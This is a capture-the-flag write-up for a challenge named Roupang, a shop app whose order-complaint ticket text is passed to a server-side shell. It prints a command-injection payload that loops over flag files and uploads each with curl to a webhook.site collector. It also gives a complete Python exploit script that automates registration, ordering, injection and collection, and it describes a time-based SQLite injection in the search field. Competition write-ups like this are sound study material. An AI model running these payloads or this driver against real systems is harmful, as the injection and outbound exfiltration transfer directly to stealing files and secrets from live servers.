    TL;DR¶

    Roupang has an order "delivery problem" ticket form:

    POST /orders/<RP...>/trouble   message=<text>

    The ticket text is processed out of band by a server-side review worker on the challenge container. The worker passes the text through a shell-style fetch/review path without sanitizing it. A ticket whose body contains a shell command runs that command as the worker:

    x; for f in localflag flag /flag; do
     curl -s --data-binary @$f https://webhook.site/<token>/localflag-<mark>;
   done;
   curl -s https://webhook.site/<token>/factory-<mark>

    The callback from the challenge host (172.237.8.236, curl/8.14.1) to /localflag-<mark> contained the local flag file body:

    Layer7{v3ry_s1mple}

    The platform credited the account at 2026-11-21 07:31:45 UTC (14:31:45 +07:00); a confirming re-submit returned HTTP 409 {"error":"challenge already solved"}.

    Recon¶

    • Target: http://172.237.8.236:24458/ (Flask/gunicorn shop).
    • Standard shop flow: register (free 3,000 cash), add address + fake card, add an in-stock product, /checkout, then /orders/<RP...>.
    • The order page contains a form:
    <h2>배송이 이상해요</h2>
<form method="post" action="/orders/RP..../trouble" class="stack">
  <input type="hidden" name="csrf" value="...">
  <label>내용<textarea name="message" maxlength="500" required></textarea></label>
  <button class="btn" type="submit">확인 요청</button>
</form>

    The page text says the ticket is forwarded to a support desk (접수만 남기고 상담 창구로 전달합니다). This is the out-of-band worker. Submitting a ticket returns 302 /orders/<RP...>?m=reported.

    A webhook.site collector was created and its URL was placed in tickets. Callbacks arrived from the challenge host itself (172.237.8.236, UA curl/8.14.1), not from a browser.

    Analysis¶

    The ticket message is not merely stored. The server-side review worker treats the ticket text as something to fetch/review and invokes a shell command built from it. Shell metacharacters are not neutralized, so a ticket like:

    x; <command>

    is executed by the worker. The successful chain enumerated likely flag paths (localflag, flag, /flag) and uploaded each file body with curl --data-binary @file to a unique webhook.site endpoint. A second curl to /factory-<mark> was used to prove the worker ran the chain even when one candidate path was missing.

    The captured request (in work/22/wh.json) is:

    {
  "ip": "172.237.8.236",
  "method": "POST",
  "user_agent": "curl/8.14.1",
  "url": "https://webhook.site/f2c45e90-b028-4993-9506-e6bec04d3a5c/localflag-133b8272",
  "content": "Layer7{v3ry_s1mple}\n",
  "size": 20,
  "created_at": "2026-11-21 07:25:08"
}

    and the near-simultaneous empty POST .../factory-133b8272 at 07:25:10. Earlier GET .../url-... and GET .../semi-... callbacks were the same worker being probed with URL / semicolon payloads.

    For completeness, the product search q parameter is also injectable (SQLite string concatenation: nfc'||randomblob(200000000)||' delays the response ~1.2 s). A time oracle over pragma_table_info showed the schema and tickets.message LIKE 'Layer7{'; the ticket row extracted that way (work/22/ticket_flag.txt) is the same flag, truncated before the closing brace. The primary and cleanly reproducible path is the ticket worker, which returned the full value including }.

    Exploit¶

    Full driver: work/22/exploit22.py (shown below; it registers, creates address/card, buys an in-stock item, submits the ticket, and polls the collector). Replace WEBHOOK_TOKEN with a webhook.site token.

    #!/usr/bin/env python3
"""Roupang (Layer7 CTF 2026, id=22) - order trouble-ticket OOB exfiltration."""
import os, re, string, time, random, requests

BASE = os.environ.get("ROUPANG_BASE", "http://172.237.8.236:24458")
TOKEN = os.environ.get("WEBHOOK_TOKEN", "")
HOOK  = f"https://webhook.site/{TOKEN}"
MARK  = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))

s = requests.Session()
s.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) roupang-poc"})

def csrf(path="/mypage"):
    r = s.get(BASE + path, timeout=15)
    m = re.search(r'name="csrf-token" content="([^"]+)"', r.text)
    if not m:
        m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    return (m.group(1) if m else None), r

def register():
    _, r = csrf("/register")
    t = re.search(r'name="csrf" value="([^"]+)"', r.text).group(1)
    user = "poc_" + "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    s.post(BASE + "/register", data={
        "csrf": t, "name": "PoC", "phone": "010-2026-1121",
        "username": user, "password": "Passw0rd!23", "next": "/",
    }, allow_redirects=False, timeout=15)
    return user

def setup():
    t, _ = csrf("/addresses")
    s.post(BASE + "/addresses", data={
        "csrf": t, "label": "factory", "recipient": "PoC", "phone": "010-2026-1121",
        "zipcode": "04383", "address1": "Seoul", "address2": "22",
    }, allow_redirects=False, timeout=15)
    t, _ = csrf("/cards")
    s.post(BASE + "/cards", data={
        "csrf": t, "number": "4111111111114242", "exp": "12/29",
        "cvc": "123", "holder": "POC",
    }, allow_redirects=False, timeout=15)

def make_order():
    t, _ = csrf()
    s.post(BASE + "/cart/add", data={"csrf": t, "slug": "ir-module", "qty": "1"},
           allow_redirects=False, timeout=15)
    r = s.get(BASE + "/cart", timeout=15)
    ids = re.findall(r'name="id" value="(\d+)"', r.text)
    if not ids:
        raise SystemExit("[-] cart empty (item out of stock)")
    iid = ids[-1]
    ck = s.get(BASE + "/checkout", params={"item": iid}, timeout=15)
    t = re.search(r'name="csrf" value="([^"]+)"', ck.text).group(1)
    addr = re.findall(r'name="address_id" value="(\d+)"', ck.text)[-1]
    card = re.findall(r'name="card_id" value="(\d+)"', ck.text)[-1]
    r = s.post(BASE + "/checkout", data={
        "csrf": t, "item": iid, "address_id": addr, "card_id": card,
    }, allow_redirects=False, timeout=15)
    loc = r.headers.get("Location", "")
    if "/orders/" not in loc:
        raise SystemExit(f"[-] checkout failed: {r.status_code} {loc}")
    return loc.split("?")[0].rstrip("/").split("/")[-1]

def send_ticket(oid):
    cmd = (
        f"x; "
        f"for f in localflag flag /flag; do "
        f"curl -s --data-binary @$f {HOOK}/localflag-{MARK}; done; "
        f"curl -s {HOOK}/factory-{MARK}"
    )
    o = s.get(BASE + "/orders/" + oid, timeout=15)
    t = re.search(r'name="csrf" value="([^"]+)"', o.text).group(1)
    r = s.post(BASE + f"/orders/{oid}/trouble",
               data={"csrf": t, "message": cmd}, allow_redirects=False, timeout=15)
    print(f"[*] ticket {oid}: {r.status_code} {r.headers.get('Location','')}")

def poll(seconds=300):
    deadline = time.time() + seconds
    seen = set()
    while time.time() < deadline:
        r = requests.get(f"https://webhook.site/token/{TOKEN}/requests", timeout=20)
        for item in r.json().get("data", []):
            body = (item.get("content") or "").strip()
            if body and item.get("uuid") not in seen:
                seen.add(item.get("uuid"))
                print(f"[+] {item.get('created_at')} {item.get('method')} "
                      f"{item.get('url')} :: {body}")
                if body.startswith("Layer7{"):
                    return body
        time.sleep(5)
    return None

if __name__ == "__main__":
    register(); setup()
    oid = make_order()
    send_ticket(oid)
    print("FLAG:", poll())
